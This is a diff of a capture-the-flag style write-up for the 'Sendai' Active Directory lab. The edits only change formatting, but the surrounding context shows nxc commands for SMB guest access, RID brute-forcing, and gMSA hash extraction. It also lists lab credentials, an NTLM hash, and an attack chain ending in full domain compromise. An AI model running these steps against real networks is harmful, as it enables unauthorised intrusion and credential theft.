@@ -32,7 +32,7 @@ Testing SMB guest access:
 nxc smb dc.sendai.vl -u 'guest' -p ''
 ```
 
-&#x20;**Result**: Guest access is enabled on the domain controller.
+**Result**: Guest access is enabled on the domain controller.
 
 #### SMB Share Enumeration
 
@@ -126,7 +126,7 @@ Extract user list via RID brute-force:
 nxc smb dc.sendai.vl -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
 ```
 
-&#x20;**Result**: Successfully extracted domain users list.
+**Result**: Successfully extracted domain users list.
 
 #### Password Spraying with Empty Passwords
 
@@ -215,7 +215,7 @@ nxc ldap DC.sendai.vl -u 'Thomas.Powell' -p 'pa$$w0rd' --gmsa
 MGTSVC$: 9ed35c68b88f35007aa32c14c1332ce7
 ```
 
-&#x20;**Key Finding**: Obtained NTLM hash for MGTSVC$ account.
+**Key Finding**: Obtained NTLM hash for MGTSVC$ account.
 
 ***
 
@@ -292,7 +292,7 @@ Verify the discovered credentials:
 nxc smb DC.sendai.vl -u clifford.davey -p RFmoB2WplgE_3p
 ```
 
-&#x20;**Result**: Credentials are valid. Clifford.Davey is a member of the CA-Operators group.
+**Result**: Credentials are valid. Clifford.Davey is a member of the CA-Operators group.
 
 ***
 
@@ -432,5 +432,4 @@ The complete attack chain for Sendai:
 10. Certificate Authentication → Full Domain Compromise
 ```
 
-<figure><img src="../../../../.gitbook/assets/complete (35).gif" alt=""><figcaption></figcaption></figure>
-
+<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
